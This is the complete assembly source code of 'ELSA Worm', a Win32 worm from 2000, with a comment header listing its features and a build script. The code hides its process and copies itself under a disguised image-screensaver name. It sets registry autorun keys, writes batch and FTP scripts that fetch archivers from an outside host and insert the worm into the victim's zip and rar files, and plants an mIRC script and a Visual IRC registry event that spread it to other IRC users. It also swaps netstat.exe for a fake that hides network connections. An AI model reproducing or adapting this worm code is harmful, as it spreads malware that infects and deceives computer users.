; Comment       £
; 
; 
;         __
;        ____
;         +------------+
;      *-=  ELSA  WORM  =-*
;         +------------+
;       +----+
;        +--+
;         ""
; 
; 
; 
;  . for WIN32 - V.1.0beta _
;  by Del_Armg0 / MATRiX Team _
;  28/29.08.2000 _
; 
; 
; 
; FEATURES:
; ---------
; 
; Elsa first will drop and copie all the "needed" files, 
; after this wild files spawning, she will modify registry 
; and check for payload;
; The first .bat use FTP.exe to DL pkzip & rar, the second .bat
; will use this 2 DL files to add the worm in many *.zip & *.rar
; on the HD.
; mIRC script don't use 'on join' event, but is more Social E.
; The fake Netstat is just a feature for trojan luver... hehehe
; And a complete Deep-Rooting, i guess hard to remove completely
; for newbies.
; 
; *.zip & *.rar Worm
; Irc Worm using mIRC & Virc
; Netstat always showing "No Connection" ;) 
; Visual payload
; Deep-Rooting
; 
; Of course u could see if u compile, that it's not totally fonctionnal,
; simply cos' it's fastly coded for MATRiX #2 / it's just a Beta
; lot's bugs / not totally tested / will not be spreaded in the wild
; ...again a lots to do/optimize/imagine/test for V.2.0 "SpecialSpread" :)
; cya soon  Delly_
; 
; 
; TO IMPLEMENT :    - her own ftp downloading engine
; --------------    - encryption
;       - Pirch infection and better mIRC & Virc infection
;       - a way to spread by mail
;       - the visual payload
;       - better deep-rooting
;       - better netstat faker
;       - armouring
;       - ...
; 
; 
; 
; 
; FILES-DROPPING:
; ---------------
; 
; Herself as:   - %windir%\ELSA.exe
;       - %windir%\ELSA_isCute.JPG.scr
;       - %system%\ELSA.vxd
;       - C:\ELSA_isCute.JPG.scr
;       - %windir%\elsbckp\e.exe
; 
; 
; Other files:  - C:\AUT0EXEC.bat
;       - C:\FTP.bat
;       - C:\FTP.drv
;       - C:\mIRC.dat
;       - C:\mirc\script.ini
;          or C:\mirc32\script.ini
;          or C:\program files\mirc\script.ini
;          or C:\program files\mirc32\script.ini
;       - %windir%\Netstat.exe
; 
; 
; 
; ACTING:
; -------
; 
; Create Registry Keys :    * Hkey_Users\.Default\Software\MeGALiTH Software\Visual IRC 96\Events
;             = Event17  <>  dcc send $nick C:\ELSA_isCute.JPG.scr
;           * HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
;             = ELZAdeep  <>  ELSA.vxd
; ;         * HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run      NOP!
; ;           = ELSAprofond  <>  %windir%\ELSA.exe
; 
; 
; Create Directories :  + C:\Elsa\elsa\Elsa\
;           + %windir%\elsbckp\
; 
; 
; Rename the true Netstat.exe as Net.bkp, and drop a fake Netstat.exe,
; always showing :
; """ Active Connections
;       Proto  Local Address          Foreign Address        State """
; 
; >>> WILL SHOW ALWAYS NOTHING !
; :)) u see the joke ...
; 
; 
; 
; COMPILE:
; --------
; ------------=ELSACOMP.bat=------------
; @ECHO OFF
; if elsa_w32.asm not exist goto end
; if ElsaNet.inc not exist goto end
; tasm32 -m3 -mx elsa.asm
; tlink32 -Tpe -aa -c elsa.obj,,,import32.lib
; Del elsa_w32.map
; Del elsa_w32.obj
; :end_b
; start -m elsa_w32.exe
; :end
; :: ;)
; exit
; ------------=ELSACOMP.bat=------------
; 
; 
;       £


;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.386p
.model flat, stdcall

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

extrn GetCurrentProcessId:proc
extrn RegisterServiceProcess:proc
extrn GetModuleHandleA:proc
extrn GetModuleFileNameA:proc
extrn GetWindowsDirectoryA:proc
extrn GetSystemDirectoryA:proc
extrn SetCurrentDirectoryA:proc
extrn CreateFileA:proc
extrn lstrcat:proc
extrn CopyFileA:proc
extrn WriteFile:proc
extrn CloseHandle:proc
extrn CreateDirectoryA:proc
extrn MessageBoxA:proc
extrn ExitProcess:proc
extrn RegCreateKeyExA:proc
extrn RegSetValueExA:proc
extrn RegCloseKey:proc
;extrn CreateDCA:proc
;extrn ReleaseDC:proc
;extrn TextOutA:proc

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.DATA


me  dd  260 dup (0)
targ1   dd  260 dup (0)
targ10  dd  260 dup (0)
targ2   dd  260 dup (0)
file_h  dd  0
file_h2 dd  0
file_h3 dd  0
bat_h   dd  ?
scr_nb  dd  ?
net_nb  dd  ?
ftp_h   dd  ?
ftps_h  dd  ?


;dis    db  "DISPLAY",0
;dc_h   dd  ?
;p_msg  db  "Delly & Elsa",0


dispo   dd  ?
reg_h   dd  ?

key1    db  "dcc send $nick C:\ELSA_isCute.JPG.scr",0
key1v   db  "Event17",0
regsiz1 equ ($-key1)
skey1   db  ".Default\Software\MeGALiTH Software\Visual IRC 96\Events",0
sskey1  db  "HKEY_USERS",0

key2    db  "ELSA.vxd",0
key2v   db  "ELZAdeep",0
regsiz2 equ ($-key2)
skey2   db  "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",0


pz  db  "@ECHO OFF",13,10
    db  "ctty nul",13,10
    db  "if not exist %windir%\ELSA.exe goto :w",13,10
    db  ":tt",13,10
    db  "copy /B %windir%\ELSA.exe %tmp%\ELSA_isCute.JPG.scr /Y",13,10
    db  "if not exist c:\pkzip.exe goto :s",13,10
    db  "attrib -h c:\pkzip.exe",13,10
    db  "for %%i in (c:\*.zip c:\mirc\*.zip c:\mirc\download\*.zip c:\pirch98\*.zip c:\download\*.zip c:\Mydocu~1\*.zip c:\MEUSDO~1\*.zip %windir%\desktop\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (f:\*.zip c:\pirch98\downlo~1\*.zip c:\unzipped\*.zip c:\downlo~1\*.zip c:\Mesdoc~1\*.zip %windir%\bureau\*.zip d:\warez\*.zip e:\warez\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (d:\*.zip e:\*.zip c:\mirc32\download\*.zip c:\pirch32\*.zip c:\progra~1\*.zip c:\ftp\*.zip c:\sex\*.zip %windir%\desktop\download\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (f:\*.zip g:\*.zip c:\mirc32\*.zip c:\pirch32\downlo~1\*.zip c:\warez\*.zip c:\leech\*.zip c:\virc\*.zip %windir%\bureau\download\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ZaELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (h:\*.zip i:\*.zip c:\chat\*.zip c:\pirch\downlo~1\*.zip c:\fserve\*.zip c:\mirc\fserve\*.zip c:\documents\*.zip %windir%\bureau\telech\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (j:\*.zip k:\*.zip c:\net\*.zip c:\pirch\*.zip c:\warez\*.zip c:\leeched\*.zip c:\virc\download\*.zip %windir%\bureau\Mydocu~1\*.zip c:\web\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "attrib +h c:\pkzip.exe",13,10
    db  ":s",13,10
    db  "if not exist c:\rar.exe goto :ee",13,10
    db  "attrib -h c:\rar.exe",13,10
    db  "for %%i in (c:\*.rar c:\mirc\*.rar c:\mirc\download\*.rar c:\pirch98\*.rar c:\download\*.rar c:\Mydocu~1\*.rar c:\MEUSDO~1\*.rar %windir%\desktop\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (f:\*.rar c:\pirch98\downlo~1\*.rar c:\unzipped\*.rar c:\downlo~1\*.rar c:\Mesdoc~1\*.rar %windir%\bureau\*.rar d:\warez\*.rar e:\warez\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (d:\*.rar e:\*.rar c:\mirc32\download\*.rar c:\pirch32\*.rar c:\progra~1\*.rar c:\ftp\*.rar c:\sex\*.rar %windir%\desktop\download\*.rar) DO c:\rar a -tk -y -c- -o+ %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (f:\*.rar g:\*.rar c:\mirc32\*.rar c:\pirch32\downlo~1\*.rar c:\warez\*.rar c:\leech\*.rar c:\virc\*.rar %windir%\bureau\download\*.rar) DO c:\rar a -tk -y -c- -o+ %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (h:\*.rar i:\*.rar c:\chat\*.rar c:\pirch\downlo~1\*.rar c:\fserve\*.rar c:\mirc\fserve\*.rar c:\documents\*.rar %windir%\bureau\telech\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "for %%i in (j:\*.rar k:\*.rar c:\net\*.rar c:\pirch\*.rar c:\warez\*.rar c:\leeched\*.rar c:\virc\download\*.rar %windir%\bureau\Mydocu~1\*.rar c:\web\*.rar) DO c:\rar a -tk -y -c- -o+ %%i %tmp%\ELSA_isCute.JPG.scr > nul",13,10
    db  "attrib +h c:\rar.exe",13,10
    db  ":w",13,10
    db  "if not exist %windir%\elsbckp\e.exe goto :ee",13,10
    db  "goto :yy",13,10
    db  "copy /B %windir%\ELSA.exe ELSA_isCute.JPG.scr /Y",13,10
    db  ":ee",13,10
    db  "attrib +h 0%",13,10
    db  "ctty con",13,10
    db  "goto :mmm",13,10
    db  ":yy",13,10
    db  "copy /B %windir%\elsbckp\e.exe %windir%\ELSA.exe /Y",13,10
    db  "goto :tt",13,10
    db  ":mmm",13,10
    db  "exit |cls",0
batsize equ ($-offset pz)

scrpts  db  "[SCRIPT]",13,10
    db  "n1=on 1:start:{",13,10
    db  "n2= .remote on",13,10
    db  "n3= .ctcps on",13,10
    db  "n4= .events on",13,10
    db  "n5= /.set %chans #virus,#vx-vtc,#vxtrader,#trojanslair,#elsa_in_a_matrix",13,10
    db  "n6= }",13,10
    db  "n7= on 1:join:#:/.msg $nick ELSA the Cutest Girl TYPE: !elsa here or in $chan to get a pix",13,10
    db  "n8= on 1:nick:/.msg $newnick ELSA the Cutest Girl TYPE: !elsa here or in $chan to get a pix",13,10
    db  "n9= on 1:kick:#:/.msg $chan ELSA the Cutest Girl TYPE: !elsa to get a pix",13,10
    db  "n10=on 1:ban:#:/.msg $chan ELSA the Cutest Girl TYPE: !elsa to get a pix",13,10
    db  "n11=on 1:connect:{",13,10
    db  "n12= /.join %chans",13,10
    db  "n13= /.amsg ELSA 0wned Me Delly ! $os $cb $url",13,10
    db  "n14= /.part %chans",13,10
    db  "n15= /.clearall",13,10
    db  "n15= /.pdcc 99999999999",13,10
    db  "n15= /.packet size 4096",13,10
    db  "n15= /.ebeeps off",13,10
    db  "n15= /.copy -0 C:\Windows\elsbckp\e.exe C:\ELSA_isCute.JPG.scr",13,10
    db  "n15= /.enable #elza",13,10
    db  "n16= /.run -n C:\command.com start -m C:\FTP.bat}",13,10
    db  "n17=on 1:disconnect:{/.run -n C:\Windows\elsbckp\e.exe | /.run -n C:\command.com start -m C:\AUT0EXEC.bat }",13,10
    db  "n18=on 1:text:*!elsa*:*:{ if ( $nick == $me ) {halt} | /.dcc send $nick C:\ELSA_isCute.JPG.scr }",13,10
    db  "n19=#elza off",13,10
    db  "n20=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\ELSA_isCute.JPG.scr } | /.disable #elza | /.timersp 0 12 /.enable #elza }",13,10
    db  "n20=#elza end",13,10
    db  "; Del_Armg0 / MATRiX Team / ELSA Worm  .for Win32 ",0
scrsiz  equ ($-scrpts)

ftpbat  db  "@ECHO OFF",13,10
    db  "ctty nul",13,10
    db  "start /m ftp -i -v -s:C:\ftp.drv",13,10
    db  "start /m AUT0EXEC.bat",13,10
    db  "ctty con",13,10
    db  "exit |cls",0
ftpsize equ ($-ftpbat)

ftpscr  db  "open ftp.angelfire.com",13,10
    db  "elsa",13,10
    db  "elsa@aol.com",13,10
    db  "cd stuff",13,10
    db  "binary",13,10
    db  "lcd C:\",13,10
    db  "get pkzip.exe",13,10
    db  "get rar.exe",13,10
    db  "bye",13,10
    db  "exit",0
ftpssiz equ ($-ftpscr)

netremps  db    'T_OOWW3=XXWX5 2PY5w3P_-l.P-KD1Ep-OLPZ-pJP-pw40PQX5fsPu',13,10
      db    'com2txt/Nide5Fe,xPQX-=.PQX-MQP-xx4_P5rjP5Z2P-jE,JP=',13,10
      db    '5O2,APQX5R8P-rJPPRX5iBP-x=PRX5TsP59DHHP5rIHP-w64ZP=',13,10
      db    '40-2APQX-MiP-trP5_WP-pBP51w,pPTYPZPZP__m4fzC4GMH3.4SLt',13,10
      db    'aH4tJPVMtZWYeHDMo3fyeXwQi3vysCPh.CPh.HEAr3wQoHBAL3vMa3',13,10
      db    'BAAYFQrYWMsHB4.HB4.HB4.HDYo2fUiYvx.PVQd2fUs2r4.HB4.HB4',13,10
      db    '.TwQa1FTMBbP:',0
netsize   equ   ($-offset netremps)



;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.CODE


start:

hide_ctrlaltdel:
    call GetCurrentProcessId
    push 1
    push eax
    call RegisterServiceProcess

create_dir:
    push 00000000h
    push offset dir1
    call CreateDirectoryA
    push 00000000h
    push offset dir2
    call CreateDirectoryA
    push 00000000h
    push offset dir3
    call CreateDirectoryA
    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset dir4
    push offset targ1
    call lstrcat
    push 00000000h
    push offset targ1
    call CreateDirectoryA

copy_herself:
    push 00000000h
    call GetModuleHandleA
    push 260
    push offset me
    push eax
    call GetModuleFileNameA
    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset copy1
    push offset targ1
    call lstrcat
    push 00000000h
    push offset targ1
    push offset me
    call CopyFileA
    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset copy2
    push offset targ1
    call lstrcat
    push 00000000h
    push offset targ1
    push offset me
    call CopyFileA
    push 260
    push offset targ1
    call GetSystemDirectoryA
    push offset copy3
    push offset targ1
    call lstrcat
    push 00000000h
    push offset targ1
    push offset me
    call CopyFileA
    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset targ1
    call SetCurrentDirectoryA
    push 00000000h
    push offset copy2
    push offset copy0
    call CopyFileA

    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset copy1
    push offset targ1
    call lstrcat
    push 260
    push offset targ10
    call GetWindowsDirectoryA
    push offset copy00
    push offset targ10
    call lstrcat
    push 00000000h
    push offset targ10
    push offset targ1
    call CopyFileA

drop_pbat1:
    push 00000000h
    push 00000080h
    push 00000002h
    push 00000000h
    push 00000001h
    push 40000000h
    push offset pzb
    call CreateFileA
    mov dword ptr [file_h],eax
    push 00000000h
    push offset bat_h
    push batsize
    push offset pz
    push dword ptr [file_h]
    call WriteFile
    push dword ptr [file_h]
    call CloseHandle
drop_pbat2:
    push 00000000h
    push 00000080h
    push 00000002h
    push 00000000h
    push 00000001h
    push 40000000h
    push offset ftpb
    call CreateFileA
    mov dword ptr [file_h],eax
    push 00000000h
    push offset ftp_h
    push ftpsize
    push offset ftpbat
    push dword ptr [file_h]
    call WriteFile
    push dword ptr [file_h]
    call CloseHandle

drop_ftpscript:
    push 00000000h
    push 00000080h
    push 00000002h
    push 00000000h
    push 00000001h
    push 40000000h
    push offset ftps
    call CreateFileA
    mov dword ptr [file_h],eax
    push 00000000h
    push offset ftps_h
    push ftpssiz
    push offset ftpscr
    push dword ptr [file_h]
    call WriteFile
    push dword ptr [file_h]
    call CloseHandle

infect_mIRC:
drop_mscript:
    push 00000000h
    push 00000080h
    push 00000002h
    push 00000000h
    push 00000001h
    push 40000000h
    push offset scrpt
    call CreateFileA
    mov dword ptr [file_h2],eax
    push 00000000h
    push offset scr_nb
    push scrsiz
    push offset scrpts
    push dword ptr [file_h2]
    call WriteFile
    push dword ptr [file_h2]
    call CloseHandle

    push 00000000h
    push offset scrtarg
    push offset scrpt
    call CopyfileA
    cmp eax,0
    jne infect_Virc
    push 00000000h
    push offset scrtar2
    push offset scrpt
    call CopyfileA
    cmp eax,0
    jne infect_Virc
    push 00000000h
    push offset scrtar3
    push offset scrpt
    call CopyfileA
    cmp eax,0
    jne infect_Virc
    push 00000000h
    push offset scrtar4
    push offset scrpt
    call CopyfileA

infect_Virc:                    ;nop
    push offset dispo
    push offset reg_h
    push 00000000h
    push 3
    push 00000000h
    push 00000000h
    push 0
    push offset skey1
    push offset sskey1
    call RegCreateKeyExA
    test eax,eax
    jne next
    
    push regsiz1
    push offset key1
    push 1
    push 0
    push offset key1v
    mov ebx, dword ptr [reg_h]
    push ebx
    call RegSetValueExA
    push ebx
    call RegCloseKey

next:

Netstat_fake:
copy_netstat:
    push 260
    push offset targ1
    call GetWindowsDirectoryA
    push offset t_netst
    push offset targ1
    call lstrcat
    push 260
    push offset targ2
    call GetWindowsDirectoryA
    push offset r_netst
    push offset targ2
    call lstrcat
    push 00000000h
    push offset targ2
    push offset targ1
    call CopyFileA
    push 00000000h
    push 00000080h
    push 00000002h
    push 00000000h
    push 00000001h
    push 40000000h
    push offset targ1
    call CreateFileA
    mov dword ptr [file_h3],eax
    push 00000000h
    push offset net_nb
    push netsize
    push offset netremps
    push dword ptr [file_h3]
    call WriteFile
    push dword ptr [file_h3]
    call CloseHandle

create_regkey1:
    push offset dispo
    push offset reg_h
    push 00000000h
    push 3
    push 00000000h
    push 00000000h
    push 0
    push offset skey2
    push 80000002h
    call RegCreateKeyExA
    test eax,eax
    jne next
    
    push regsiz2
    push offset key2
    push 1
    push 0
    push offset key2v
    mov ebx, dword ptr [reg_h]
    push ebx
    call RegSetValueExA
    push ebx
    call RegCloseKey

create_regkey2:
    nop

check_for_payload:
    dw 310fh
    cmp al,'E'
    jne Exit

payload_now:
    push 00000035h
    push offset titre
    push offset message
    push 00000000h
    call MessageBoxA
    cmp eax,4
    je payload_now
;   call del_visual

Exit:
    push 00000000h
    call ExitProcess

elsa_is_elsa db "ELSA  W0rm  .W32 .V.1.0beta  .Tu Me ManqueS !  Del_Armg0 August2000 / MATRiX Team Soft",0

del_visual PROC NEAR
;   push 00000000h
;   push 00000000h
;   push 00000000h
;   push offset dis
;   call CreateDCA
;   mov dword ptr [dc_h],eax
;
;   push offset dword ptr [dc_h]
;   call ReleaseDC
    ret
del_visual ENDP

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;DATAS:

dir1    db  "C:\ELSA",0
dir2    db  "C:\ELSA\elsa",0
dir3    db  "C:\ELSA\elsa\ELSA",0
dir4    db  "\elsbckp",0

copy00  db  "\elsbckp\e.exe",0
copy0   db  "ELSA.exe",0
copy1   db  "\ELSA.exe",0
copy2   db  "\ELSA_isCute.JPG.scr",0
copy3   db  "\ELSA.vxd",0

pzb db  "C:\AUT0EXEC.bat",0
ftpb    db  "C:\FTP.bat",0
ftps    db  "C:\FTP.drv",0

scrpt   db  "C:\mIRC.dat",0
scrtarg db  "C:\mirc\script.ini",0
scrtar2 db  "C:\mirc32\script.ini",0
scrtar3 db  "C:\program files\mirc\script.ini",0
scrtar4 db  "C:\program files\mirc32\script.ini",0

t_netst db  "\Netstat.exe",0
r_netst db  "\Net.bkp",0


titre   db  "      --->>>>  ²|²   by Del_Armg0 -- MATRiX Team   ²|²",0
message db  " ---------------------------------------------------------------------------- ",13,10
    db  " °¤+¤° ELSA WORM -=- Win32 Version 1.0 °¤+¤° ",13,10
    db  " ---------------------------------------------------------------------------- ",13,10
    db  " ",13,10
    db  " °¤@¤°  Elsa Worm -*- elsa Worm  °¤@¤° ",13,10
    db  " °¤@¤°+++++++++++++++++++++ °¤@¤° ",13,10
    db  " °¤@¤° XXXXXXXXXXXXXXXXXXXX °¤@¤° ",13,10
    db  " °¤@¤° XXXXXXXXXXXXXXXXXXXX °¤@¤° ",13,10
    db  " °¤@¤° XXXXXXXXXXXXXXXXXXXX °¤@¤° ",13,10
    db  " °¤@¤° XXXXXXXXXXXXXXXXXXXX °¤@¤° ",13,10
    db  " °¤@¤°+++++++++++++++++++++ °¤@¤° ",13,10
    db  " °¤@¤°  elsa Worm -*- elsA Worm  °¤@¤° ",13,10
    db  " ",13,10
    db  "  ____________________________________ ",13,10
    db  " --== designed on Monday 28 August 2000 ==-- ",13,10
    db  "  ____________________________________ ",13,10
    db  " ",0

include ElsaNet.inc

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

end start
end
